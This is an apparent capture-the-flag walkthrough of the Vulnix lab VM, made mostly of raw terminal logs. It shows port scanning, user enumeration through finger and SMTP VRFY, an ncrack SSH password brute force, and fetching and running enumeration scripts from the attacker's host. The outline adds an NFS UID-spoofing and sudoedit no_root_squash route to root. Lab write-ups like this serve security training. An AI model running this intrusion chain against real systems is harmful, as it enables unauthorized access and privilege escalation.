@@ -1,0 +1,2646 @@
+================================================================================================================================================================
+Walkthrough of the HackLab Vulnix VulnHub VM CTF
+================================================================================================================================================================
+
+Step 1. Scanning and Enumeration
+	> NMAP scan + user account enumeration using SMTP VRFY command or Finger command
+
+
+Step 2. Gaining access
+	Step 1. Password brute-force attack with ncrack against the Linux accounts the we have enumerated (e.g. root, backup, user, vulnix)
+	Step 2. Log into the Linux server as the 'user' account which is protected by a weak password (letmein)
+
+
+Step 3. Privesc from 'user' account to 'vulnix' account (manual research + LinEnum + Linux-exploit-suggester)
+	Step 1. Logged as 'user', identify the UID of the 'vulnix' account (2008)
+	Step 2. Mount the insecure NFS v3 share "/home/vulnix" 
+	Step 3. Create a new local account with UID '2008' to be able access the NFS share as the user 'vulnix' (known security issue in NFS versions 2 and 3)
+	Step 4. Add our SSH public key to "/home/vulnix/.ssh/authorized_keys"
+	Step 5. Log into the Linux server as the 'vulnix' user
+
+
+Step 4. Privesc from 'vulnix' account to root
+	Step 1. Exploit SUDO misconfiguration (the account 'vulnix' can run SUDOEDIT /etc/exports without password) 
+    	Step 2. Modify the NFS export configuration using SUDOEDIT  (add "/root *(rw, no_root_squash)")
+	Step 3. Mount the new NFS share "/root" and add our SSH public key to "/root/.ssh/authorized_keys"
+	Step 4. Log into the Linux server as root with our private SSH key	
+
+
++ Note 1: I also tried several exploits identified with 'Linux-exploit-suggester' that I successfully used on other CTFs but that did not work this time: 
+	  - DirtyC0w (CVE-2016-5195)
+	  - the privesc exploit for the "Sudo version 1.8.3p1" (CVE-2012-0809 - https://www.exploit-db.com/exploits/25134)
+		
++ Note 2: I discovered afterwards that I could have use the tool NfSpy (https://github.com/bonsaiviking/NfSpy) to automate the NFS "attack" and directly gain access as 'vulnix'...
+
+
+================================================================================================================================================================
+Step 1. Scanning and Enumeration
+================================================================================================================================================================
+
+root@Security-Audit-01:/home/pentester# netdiscover
+
+ Currently scanning: 192.168.36.0/16   |   Screen View: Unique Hosts                                                                                                                                     
+                                                                                                                                                                                                         
+ 5 Captured ARP Req/Rep packets, from 5 hosts.   Total size: 300                                                                                                                                         
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 192.168.1.3     14:0c:76:53:4d:4e      1      60  FREEBOX SAS                                                                                                                                           
+ 192.168.1.29    f4:5c:89:c9:be:c5      1      60  Apple, Inc.                                                                                                                                           
+ 192.168.1.37    08:00:27:8b:ea:be      1      60  PCS Systemtechnik GmbH                                                                                                                                
+ 192.168.1.254   68:a3:78:8b:0c:dd      1      60  FREEBOX SAS                                                                                                                                           
+ 192.168.27.1    14:0c:76:53:4d:4e      1      60  FREEBOX SAS                                                                                                                                           
+
+================================================================================================================================================================
+
+root@Security-Audit-01:/home/pentester# nmap -sS -sV -Pn -A -p 1-65535 -sC -v 192.168.1.37 
+Starting Nmap 7.70 ( https://nmap.org )
+NSE: Loaded 148 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 22:12
+Completed NSE at 22:12, 0.00s elapsed
+Initiating NSE at 22:12
+Completed NSE at 22:12, 0.00s elapsed
+Initiating ARP Ping Scan at 22:12
+Scanning 192.168.1.37 [1 port]
+Completed ARP Ping Scan at 22:12, 0.04s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 22:12
+Completed Parallel DNS resolution of 1 host. at 22:12, 0.00s elapsed
+Initiating SYN Stealth Scan at 22:12
+Scanning 192.168.1.37 [65535 ports]
+Discovered open port 111/tcp on 192.168.1.37
+Discovered open port 22/tcp on 192.168.1.37
+Discovered open port 993/tcp on 192.168.1.37
+Discovered open port 143/tcp on 192.168.1.37
+Discovered open port 995/tcp on 192.168.1.37
+Discovered open port 25/tcp on 192.168.1.37
+Discovered open port 110/tcp on 192.168.1.37
+Discovered open port 50352/tcp on 192.168.1.37
+Discovered open port 42151/tcp on 192.168.1.37
+Discovered open port 2049/tcp on 192.168.1.37
+Discovered open port 512/tcp on 192.168.1.37
+Discovered open port 37168/tcp on 192.168.1.37
+Discovered open port 514/tcp on 192.168.1.37
+Discovered open port 59900/tcp on 192.168.1.37
+Discovered open port 56364/tcp on 192.168.1.37
+Discovered open port 513/tcp on 192.168.1.37
+Discovered open port 79/tcp on 192.168.1.37
+Completed SYN Stealth Scan at 22:12, 7.45s elapsed (65535 total ports)
+<SNIP>
+
+Nmap scan report for 192.168.1.37
+Host is up (0.00068s latency).
+Not shown: 65518 closed ports
+
+PORT      STATE SERVICE    VERSION
+22/tcp    open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 10:cd:9e:a0:e4:e0:30:24:3e:bd:67:5f:75:4a:33:bf (DSA)
+|   2048 bc:f9:24:07:2f:cb:76:80:0d:27:a6:48:52:0a:24:3a (RSA)
+|_  256 4d:bb:4a:c1:18:e8:da:d1:82:6f:58:52:9c:ee:34:5f (ECDSA)
+
+25/tcp    open  smtp       Postfix smtpd
+|_smtp-commands: vulnix, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
+|_ssl-date: 2019-03-02T21:12:46+00:00; -1s from scanner time.
+
+79/tcp    open  finger     Linux fingerd
+|_finger: No one logged on.\x0D
+
+110/tcp   open  pop3       Dovecot pop3d
+|_pop3-capabilities: TOP UIDL RESP-CODES STLS CAPA SASL PIPELINING
+|_ssl-date: 2019-03-02T21:12:45+00:00; 0s from scanner time.
+
+111/tcp   open  rpcbind    2-4 (RPC #100000)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100003  2,3,4       2049/tcp  nfs
+|   100003  2,3,4       2049/udp  nfs
+|   100005  1,2,3      38749/udp  mountd
+|   100005  1,2,3      42151/tcp  mountd
+|   100021  1,3,4      37079/udp  nlockmgr
+|   100021  1,3,4      56364/tcp  nlockmgr
+|   100024  1          54483/udp  status
+|   100024  1          59900/tcp  status
+|   100227  2,3         2049/tcp  nfs_acl
+|_  100227  2,3         2049/udp  nfs_acl
+
+143/tcp   open  imap       Dovecot imapd
+|_imap-capabilities: IMAP4rev1 Pre-login ID more have post-login listed capabilities IDLE ENABLE LITERAL+ LOGIN-REFERRALS LOGINDISABLEDA0001 OK STARTTLS SASL-IR
+|_ssl-date: 2019-03-02T21:12:46+00:00; 0s from scanner time.
+
+512/tcp   open  exec       netkit-rsh rexecd
+
+513/tcp   open  login      OpenBSD or Solaris rlogind
+
+514/tcp   open  tcpwrapped
+
+993/tcp   open  ssl/imaps?
+|_ssl-date: 2019-03-02T21:12:45+00:00; 0s from scanner time.
+
+995/tcp   open  ssl/pop3s?
+|_ssl-date: 2019-03-02T21:12:45+00:00; 0s from scanner time.
+
+2049/tcp  open  nfs_acl    2-3 (RPC #100227)
+
+37168/tcp open  mountd     1-3 (RPC #100005)
+42151/tcp open  mountd     1-3 (RPC #100005)
+50352/tcp open  mountd     1-3 (RPC #100005)
+56364/tcp open  nlockmgr   1-4 (RPC #100021)
+59900/tcp open  status     1 (RPC #100024)
+
+MAC Address: 08:00:27:8B:EA:BE (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 2.6.X|3.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
+OS details: Linux 2.6.32 - 3.10
+Uptime guess: 0.007 days (since Mon Mar  2 22:05:31 2019)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=260 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: Host:  vulnix; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.68 ms 192.168.1.37
+
+NSE: Script Post-scanning.
+Initiating NSE at 22:15
+Completed NSE at 22:15, 0.00s elapsed
+Initiating NSE at 22:15
+Completed NSE at 22:15, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 166.28 seconds
+           Raw packets sent: 65558 (2.885MB) | Rcvd: 65550 (2.623MB)
+
+
+================================================================================================================================================================
+root@Security-Audit-01:/home/pentester# showmount -e 192.168.1.37
+Export list for 192.168.1.37:
+/home/vulnix *
+
+root@Security-Audit-01:/home/pentester# mkdir /mnt/temp/
+
+root@Security-Audit-01:/home/pentester# mount -t nfs 192.168.1.37:/home/vulnix /mnt/temp/ -o nolock
+
+root@Security-Audit-01:/home/pentester# ls -al /mnt/temp
+ls: cannot open directory '/mnt/temp': Permission denied
+
+root@Security-Audit-01:/mnt# df -h
+Filesystem                 Size  Used Avail Use% Mounted on
+udev                       3.9G     0  3.9G   0% /dev
+tmpfs                      799M  9.3M  789M   2% /run
+/dev/sda1                   60G   21G   37G  36% /
+tmpfs                      3.9G     0  3.9G   0% /dev/shm
+tmpfs                      5.0M     0  5.0M   0% /run/lock
+tmpfs                      3.9G     0  3.9G   0% /sys/fs/cgroup
+tmpfs                      799M   16K  799M   1% /run/user/130
+tmpfs                      799M   32K  799M   1% /run/user/0
+tmpfs                      799M     0  799M   0% /run/user/1000
+192.168.1.37:/home/vulnix  774M  702M   34M  96% /mnt/temp
+
+pentester@Security-Audit-01:/mnt$ ls -al
+total 16
+drwxr-xr-x  4 root   root   4096 Mar  2 22:24 .
+drwxr-xr-x 24 root   root   4096 Jul 16  2018 ..
+drwxr-xr-x  2 root   root   4096 Mar  2 22:27 nfstest
+drwxr-x---  2 nobody nobody 4096 Sep  2  2012 temp
+
+
+================================================================================================================================================================
+Username enumeration using FINGER
+----------------------------------
+pentester@Security-Audit-01:~$ finger -l @192.168.1.37
+No one logged on.
+
+pentester@Security-Audit-01:~$ finger -l root@192.168.1.37
+Login: root           			Name: root
+Directory: /root                    	Shell: /bin/bash
+Never logged in.
+No mail.
+No Plan.
+
+pentester@Security-Audit-01:~$ finger -l vulnix@192.168.1.37
+Login: vulnix         			Name: 
+Directory: /home/vulnix             	Shell: /bin/bash
+Never logged in.
+No mail.
+No Plan.
+
+pentester@Security-Audit-01:~$ finger -l test@192.168.1.37
+finger: test: no such user.
+
+pentester@Security-Audit-01:~$ finger -l admin@192.168.1.37
+finger: admin: no such user.
+
+pentester@Security-Audit-01:~$ finger -l nfs@192.168.1.37
+finger: nfs: no such user.
+
+pentester@Security-Audit-01:~$ finger -l imap@192.168.1.37
+finger: imap: no such user.
+
+pentester@Security-Audit-01:~$ finger -l nobody@192.168.1.37
+Login: nobody         			Name: nobody
+Directory: /nonexistent             	Shell: /bin/sh
+Never logged in.
+No mail.
+No Plan.
+
+pentester@Security-Audit-01:~$ finger -l ftp@192.168.1.37
+finger: ftp: no such user.
+
+pentester@Security-Audit-01:~$ finger -l ftpuser@192.168.1.37
+finger: ftpuser: no such user.
+
+pentester@Security-Audit-01:~$ finger -l user@192.168.1.37
+Login: user           			Name: user
+Directory: /home/user               	Shell: /bin/bash
+Never logged in.
+No mail.
+No Plan.
+
+Login: dovenull       			Name: Dovecot login user
+Directory: /nonexistent             	Shell: /bin/false
+Never logged in.
+No mail.
+No Plan.
+
+pentester@Security-Audit-01:~$ finger -l backup@192.168.1.37
+Login: backup         			Name: backup
+Directory: /var/backups             	Shell: /bin/sh
+Never logged in.
+No mail.
+No Plan.
+
+================================================================================================================================================================
+Username enumeration using SMTP VRFY enumeration
+--------------------------------------------------
+
+root@Security-Audit-01:/usr/share/metasploit-framework# nc 192.168.1.37 25
+220 vulnix ESMTP Postfix (Ubuntu)
+help
+502 5.5.2 Error: command not recognized
+
+helo vulnix
+250 vulnix
+
+vulnix
+502 5.5.2 Error: command not recognized
+
+VRFY root
+252 2.0.0 root
+
+VRFY test
+550 5.1.1 <test>: Recipient address rejected: User unknown in local recipient table
+
+VRFY vulnix
+252 2.0.0 vulnix
+
+VRFY admin
+550 5.1.1 <admin>: Recipient address rejected: User unknown in local recipient table
+
+VRFY backup
+252 2.0.0 backup
+
+VRFY dev
+550 5.1.1 <dev>: Recipient address rejected: User unknown in local recipient table
+
+VRFY audit
+550 5.1.1 <audit>: Recipient address rejected: User unknown in local recipient table
+
+VRFY user
+252 2.0.0 user
+
+--------------------------------
+
+root@Security-Audit-01:/mnt# nmap -sV -sS --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY} -p 25 192.168.1.37
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-02 22:45 CET
+Nmap scan report for 192.168.1.37
+Host is up (0.00069s latency).
+
+PORT   STATE SERVICE VERSION
+25/tcp open  smtp    Postfix smtpd
+| smtp-enum-users: 
+|_  Couldn't find any accounts
+MAC Address: 08:00:27:8B:EA:BE (Oracle VirtualBox virtual NIC)
+Service Info: Host:  vulnix
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 0.82 seconds
+
+--------------------------------
+
+root@Security-Audit-01:/mnt# smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t 192.168.1.37
+Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
+
+ ----------------------------------------------------------
+|                   Scan Information                       |
+ ----------------------------------------------------------
+
+Mode ..................... VRFY
+Worker Processes ......... 5
+Usernames file ........... /usr/share/metasploit-framework/data/wordlists/unix_users.txt
+Target count ............. 1
+Username count ........... 113
+Target TCP port .......... 25
+Query timeout ............ 5 secs
+Target domain ............ 
+
+######## Scan started at Mon Mar 2 22:49:47 2019 #########
+192.168.1.33: ROOT exists
+192.168.1.33: backup exists
+192.168.1.33: bin exists
+192.168.1.33: daemon exists
+192.168.1.33: games exists
+192.168.1.33: gnats exists
+192.168.1.33: irc exists
+192.168.1.33: libuuid exists
+192.168.1.33: list exists
+192.168.1.33: lp exists
+192.168.1.33: mail exists
+192.168.1.33: man exists
+192.168.1.33: messagebus exists
+192.168.1.33: news exists
+192.168.1.33: nobody exists
+192.168.1.33: postmaster exists
+192.168.1.33: proxy exists
+192.168.1.33: root exists
+192.168.1.33: sshd exists
+192.168.1.33: sync exists
+192.168.1.33: sys exists
+192.168.1.33: syslog exists
+192.168.1.33: user exists
+192.168.1.33: uucp exists
+192.168.1.33: www-data exists
+######## Scan completed at Mon Mar 2 22:49:47 2019 #########
+25 results.
+
+113 queries in 1 seconds (113.0 queries / sec)
+root@Security-Audit-01:/mnt# 
+
+
+================================================================================================================================================================
+RLGIN tests
+
+root@Security-Audit-01:/home/pentester# rlogin -l root 192.168.1.37
+The authenticity of host '192.168.1.37 (192.168.1.37)' can't be established.
+ECDSA key fingerprint is SHA256:IGOuLMZRTuUvY58a8TN+ef/1zyRCAHk0qYP4wMViOAg.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '192.168.1.37' (ECDSA) to the list of known hosts.
+root@192.168.1.37's password: 
+Permission denied, please try again.
+root@192.168.1.37's password: 
+Permission denied, please try again.
+root@192.168.1.37's password: 
+root@192.168.1.37: Permission denied (publickey,password).
+
+root@Security-Audit-01:/home/pentester# rsh -l root 192.168.1.37
+root@192.168.1.37's password: 
+Permission denied, please try again.
+root@192.168.1.37's password: 
+Permission denied, please try again.
+root@192.168.1.37's password: 
+root@192.168.1.37: Permission denied (publickey,password).
+
+root@Security-Audit-01:/usr/share/metasploit-framework# rlogin -l backup 192.168.1.37
+backup@192.168.1.37's password: 
+Permission denied, please try again.
+backup@192.168.1.37's password: 
+Permission denied, please try again.
+backup@192.168.1.37's password: 
+backup@192.168.1.37: Permission denied (publickey,password).
+
+root@Security-Audit-01:/usr/share/metasploit-framework# rlogin -l vulnix 192.168.1.37
+vulnix@192.168.1.37's password: 
+Permission denied, please try again.
+vulnix@192.168.1.37's password: 
+Permission denied, please try again.
+vulnix@192.168.1.37's password: 
+vulnix@192.168.1.37: Permission denied (publickey,password).
+
+root@Security-Audit-01:/usr/share/metasploit-framework# rlogin -l user 192.168.1.37
+user@192.168.1.37's password: 
+Permission denied, please try again.
+user@192.168.1.37's password: 
+Permission denied, please try again.
+user@192.168.1.37's password: 
+user@192.168.1.37: Permission denied (publickey,password).
+
+pentester@Security-Audit-01:~$ rlogin -l nobody 192.168.1.37
+The authenticity of host '192.168.1.37 (192.168.1.37)' can't be established.
+ECDSA key fingerprint is SHA256:IGOuLMZRTuUvY58a8TN+ef/1zyRCAHk0qYP4wMViOAg.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '192.168.1.37' (ECDSA) to the list of known hosts.
+nobody@192.168.1.37's password: 
+Permission denied, please try again.
+nobody@192.168.1.37's password: 
+Permission denied, please try again.
+nobody@192.168.1.37's password: 
+nobody@192.168.1.37: Permission denied (publickey,password).
+
+
+================================================================================================================================================================
+Step 2. Gaining access
+================================================================================================================================================================
+
+root@Security-Audit-01:~/Desktop/CTFs/HackLab# cat users.txt 
+user
+vulnix
+root
+backup
+
+
+root@Security-Audit-01:~/Desktop/CTFs/HackLab# ncrack -vv -U users.txt -P /usr/share/wordlists/rockyou.txt -T4 192.168.1.37:22
+
+Starting Ncrack 0.7 ( http://ncrack.org ) at 2019-03-03 00:41 CET
+
+Stats: 0:01:52 elapsed; 0 services completed (1 total)
+Rate: 6.58; Found: 0; About 0.00% done
+(1 total)
+Rate: 7.18; Found: 0; About 0.00% done
+Discovered credentials on ssh://192.168.1.37:22 'user' 'letmein'
+Stats: 0:07:33 elapsed; 0 services completed (1 total)
+Rate: 7.52; Found: 1; About 0.00% done
+(press 'p' to list discovered credentials)
+Stats: 0:09:57 elapsed; 0 services completed (1 total)
+Rate: 8.27; Found: 1; About 0.00% done
+(press 'p' to list discovered credentials)
+<SNIP>
+
+user@Security-Audit-01:/root/Desktop/CTFs/HackLab$ rlogin 192.168.1.37
+The authenticity of host '192.168.1.37 (192.168.1.37)' can't be established.
+ECDSA key fingerprint is SHA256:IGOuLMZRTuUvY58a8TN+ef/1zyRCAHk0qYP4wMViOAg.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '192.168.1.37' (ECDSA) to the list of known hosts.
+user@192.168.1.37's password: 
+Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)
+
+ * Documentation:  https://help.ubuntu.com/
+
+  System information as of Tue Mar  3 00:00:06 GMT 2019
+
+  System load:  0.36             Processes:           88
+  Usage of /:   91.3% of 773MB   Users logged in:     0
+  Memory usage: 4%               IP address for eth0: 192.168.1.37
+  Swap usage:   0%
+
+  => / is using 91.3% of 773MB
+
+  Graph this data and manage this system at https://landscape.canonical.com/
+
+New release '14.04.6 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+Last login: Mon Mar  2 23:41:36 2019 from 192.168.1.8
+
+user@vulnix:~$ ls -al
+total 32
+drwxr-x--- 3 user user 4096 Mar  2 23:43 .
+drwxr-xr-x 4 root root 4096 Sep  2  2012 ..
+-rw------- 1 user user   28 Mar  2 23:43 .bash_history
+-rw-r--r-- 1 user user  220 Sep  2  2012 .bash_logout
+-rw-r--r-- 1 user user 3486 Sep  2  2012 .bashrc
+drwx------ 2 user user 4096 Sep  2  2012 .cache
+-rw-r--r-- 1 user user  675 Sep  2  2012 .profile
+-rw------- 1 user user    7 Sep  2  2012 .rhosts
+
+user@vulnix:~$ cat .rhosts
++ user
+
+user@vulnix:~$ cat .bash_history 
+id
+ls -al
+cat .rhosts 
+exit
+
+================================================================================================================================================================
+Step 3. Privesc from 'user' account to 'vulnix' account (manual research + LinEnum + Linux-exploit-suggester)
+================================================================================================================================================================
+
+
+user@vulnix:~$ wget http://192.168.1.8:8000/Linux-exploit-suggester.sh
+--2019-03-03 00:11:07--  http://192.168.1.8:8000/Linux-exploit-suggester.sh
+Connecting to 192.168.1.8:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 65666 (64K) [text/x-sh]
+Saving to: `Linux-exploit-suggester.sh'
+
+100%[================================================================================================================================================================>] 65,666      --.-K/s   in 0.001s  
+
+2019-03-03 00:11:07 (96.5 MB/s) - `Linux-exploit-suggester.sh' saved [65666/65666]
+
+user@vulnix:~$ ls
+Linux-exploit-suggester.sh
+
+user@vulnix:~$ ls -al
+total 100
+drwxr-x--- 3 user user  4096 Mar  3 00:11 .
+drwxr-xr-x 4 root root  4096 Sep  2  2012 ..
+-rw------- 1 user user    28 Mar  2 23:43 .bash_history
+-rw-r--r-- 1 user user   220 Sep  2  2012 .bash_logout
+-rw-r--r-- 1 user user  3486 Sep  2  2012 .bashrc
+drwx------ 2 user user  4096 Sep  2  2012 .cache
+-rw-rw-r-- 1 user user 65666 Jul 15  2018 Linux-exploit-suggester.sh
+-rw-r--r-- 1 user user   675 Sep  2  2012 .profile
+-rw------- 1 user user     7 Sep  2  2012 .rhosts
+
+user@vulnix:~$ chmod +x Linux-exploit-suggester.sh 
+
+user@vulnix:~$ wget http://192.168.1.8:8000/LinEnum.sh 
+--2019-03-03 00:12:37--  http://192.168.1.8:8000/LinEnum.sh
+Connecting to 192.168.1.8:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 44413 (43K) [text/x-sh]
+Saving to: `LinEnum.sh'
+
+100%[================================================================================================================================================================>] 44,413       252K/s   in 0.2s    
+
+2019-03-03 00:12:37 (252 KB/s) - `LinEnum.sh' saved [44413/44413]
+
+user@vulnix:~$ chmod +x LinEnum.sh
+
+user@vulnix:~$ ./LinEnum.sh -h
+./LinEnum.sh: option requires an argument -- h
+
+#########################################################
+# Local Linux Enumeration & Privilege Escalation Script #
+#########################################################
+# www.rebootuser.com | @rebootuser 
+# version 0.91
+
+# Example: ./LinEnum.sh -k keyword -r report -e /tmp/ -t 
+
+OPTIONS:
+-k	Enter keyword
+-e	Enter export location
+-s 	Supply user password for sudo checks (INSECURE)
+-t	Include thorough (lengthy) tests
+-r	Enter report name
+-h	Displays this help text
+
+
+Running with no options = limited scans/no output file
+#########################################################
+user@vulnix:~$ ./LinEnum.sh -t
+
+#########################################################
+# Local Linux Enumeration & Privilege Escalation Script #
+#########################################################
+# www.rebootuser.com
+# version 0.91
+
+[-] Debug Info
+[+] Thorough tests = Enabled
+
+
+Scan started at:
+Tue Mar  3 00:15:06 GMT 2019
+
+
+### SYSTEM ##############################################
+[-] Kernel information:
+Linux vulnix 3.2.0-29-generic-pae #46-Ubuntu SMP Fri Jul 27 17:25:43 UTC 2012 i686 i686 i386 GNU/Linux
+
+
+[-] Kernel information (continued):
+Linux version 3.2.0-29-generic-pae (buildd@roseapple) (gcc version 4.6.3 (Ubuntu/Linaro 4.6.3-1ubuntu5) ) #46-Ubuntu SMP Fri Jul 27 17:25:43 UTC 2012
+
+
+[-] Specific release information:
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=12.04
+DISTRIB_CODENAME=precise
+DISTRIB_DESCRIPTION="Ubuntu 12.04.1 LTS"
+
+
+[-] Hostname:
+vulnix
+
+
+### USER/GROUP ##########################################
+[-] Current user/group info:
+uid=1000(user) gid=1000(user) groups=1000(user),100(users)
+
+
+[-] Users that have previously logged onto the system:
+Username         Port     From             Latest
+user             pts/0    192.168.1.8      Tue Mar  3 00:00:07 +0000 2019
+
+
+[-] Who else is logged on:
+ 00:15:06 up  3:14,  1 user,  load average: 0.00, 0.04, 0.17
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+user     pts/0    192.168.1.8      00:00    2.00s  0.24s  0.00s /bin/bash ./Lin
+
+
+[-] Group memberships:
+uid=0(root) gid=0(root) groups=0(root)
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+uid=2(bin) gid=2(bin) groups=2(bin)
+uid=3(sys) gid=3(sys) groups=3(sys)
+uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
+uid=5(games) gid=60(games) groups=60(games)
+uid=6(man) gid=12(man) groups=12(man)
+uid=7(lp) gid=7(lp) groups=7(lp)
+uid=8(mail) gid=8(mail) groups=8(mail)
+uid=9(news) gid=9(news) groups=9(news)
+uid=10(uucp) gid=10(uucp) groups=10(uucp)
+uid=13(proxy) gid=13(proxy) groups=13(proxy)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=34(backup) gid=34(backup) groups=34(backup)
+uid=38(list) gid=38(list) groups=38(list)
+uid=39(irc) gid=39(irc) groups=39(irc)
+uid=41(gnats) gid=41(gnats) groups=41(gnats)
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+uid=100(libuuid) gid=101(libuuid) groups=101(libuuid)
+uid=101(syslog) gid=103(syslog) groups=103(syslog)
+uid=102(messagebus) gid=105(messagebus) groups=105(messagebus)
+uid=103(whoopsie) gid=106(whoopsie) groups=106(whoopsie)
+uid=104(postfix) gid=110(postfix) groups=110(postfix)
+uid=105(dovecot) gid=112(dovecot) groups=112(dovecot)
+uid=106(dovenull) gid=65534(nogroup) groups=65534(nogroup)
+uid=107(landscape) gid=113(landscape) groups=113(landscape)
+uid=108(sshd) gid=65534(nogroup) groups=65534(nogroup)
+uid=1000(user) gid=1000(user) groups=1000(user),100(users)
+uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
+uid=109(statd) gid=65534(nogroup) groups=65534(nogroup)
+
+
+[-] Contents of /etc/passwd:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+syslog:x:101:103::/home/syslog:/bin/false
+messagebus:x:102:105::/var/run/dbus:/bin/false
+whoopsie:x:103:106::/nonexistent:/bin/false
+postfix:x:104:110::/var/spool/postfix:/bin/false
+dovecot:x:105:112:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
+dovenull:x:106:65534:Dovecot login user,,,:/nonexistent:/bin/false
+landscape:x:107:113::/var/lib/landscape:/bin/false
+sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
+user:x:1000:1000:user,,,:/home/user:/bin/bash
+vulnix:x:2008:2008::/home/vulnix:/bin/bash
+statd:x:109:65534::/var/lib/nfs:/bin/false
+
+
+[-] Super user account(s):
+root
+
+
+[-] Are permissions on /home directories lax:
+total 16K
+drwxr-xr-x  4 root   root   4.0K Sep  2  2012 .
+drwxr-xr-x 22 root   root   4.0K Sep  2  2012 ..
+drwxr-x---  3 user   user   4.0K Mar  3 00:12 user
+drwxr-x---  2 vulnix vulnix 4.0K Sep  2  2012 vulnix
+
+
+[-] Files owned by our user:
+-rw-r--r-- 1 user user 0 Sep  2  2012 /home/user/.cache/motd.legal-displayed
+-rw-r--r-- 1 user user 220 Sep  2  2012 /home/user/.bash_logout
+-rw-r--r-- 1 user user 675 Sep  2  2012 /home/user/.profile
+-rw------- 1 user user 28 Mar  2 23:43 /home/user/.bash_history
+-rwxrwxr-x 1 user user 65666 Jul 15  2018 /home/user/Linux-exploit-suggester.sh
+-rw-r--r-- 1 user user 3486 Sep  2  2012 /home/user/.bashrc
+-rwxrwxr-x 1 user user 44413 Jul 15  2018 /home/user/LinEnum.sh
+-rw------- 1 user user 7 Sep  2  2012 /home/user/.rhosts
+
+
+[-] Hidden files:
+-rw-r--r-- 1 root root 102 Jun 19  2012 /etc/cron.monthly/.placeholder
+-rw-r--r-- 1 root root 628 Sep  2  2012 /etc/apparmor.d/cache/.features
+-rw------- 1 root root 0 Sep  2  2012 /etc/.pwd.lock
+-rw-r--r-- 1 root root 0 Sep  2  2012 /etc/init.d/.legacy-bootordering
+-rw-r--r-- 1 root root 102 Jun 19  2012 /etc/cron.d/.placeholder
+-rw-r--r-- 1 root root 220 Apr  3  2012 /etc/skel/.bash_logout
+-rw-r--r-- 1 root root 675 Apr  3  2012 /etc/skel/.profile
+-rw-r--r-- 1 root root 3486 Apr  3  2012 /etc/skel/.bashrc
+-rw-r--r-- 1 root root 102 Jun 19  2012 /etc/cron.daily/.placeholder
+-rw-r--r-- 1 root root 102 Jun 19  2012 /etc/cron.weekly/.placeholder
+-rw-r--r-- 1 root root 102 Jun 19  2012 /etc/cron.hourly/.placeholder
+-rw------- 1 root root 1024 Sep  2  2012 /.rnd
+-rw------- 1 root root 0 Sep  2  2012 /var/lib/nfs/.xtab.lock
+-rw------- 1 root root 0 Mar  2 21:42 /var/lib/nfs/.rmtab.lock
+-rw------- 1 root root 0 Sep  2  2012 /var/lib/nfs/.etab.lock
+-rw-r--r-- 1 user user 220 Sep  2  2012 /home/user/.bash_logout
+-rw-r--r-- 1 user user 675 Sep  2  2012 /home/user/.profile
+-rw------- 1 user user 28 Mar  2 23:43 /home/user/.bash_history
+-rw-r--r-- 1 user user 3486 Sep  2  2012 /home/user/.bashrc
+-rw------- 1 user user 7 Sep  2  2012 /home/user/.rhosts
+
+
+[-] World-readable files within /home:
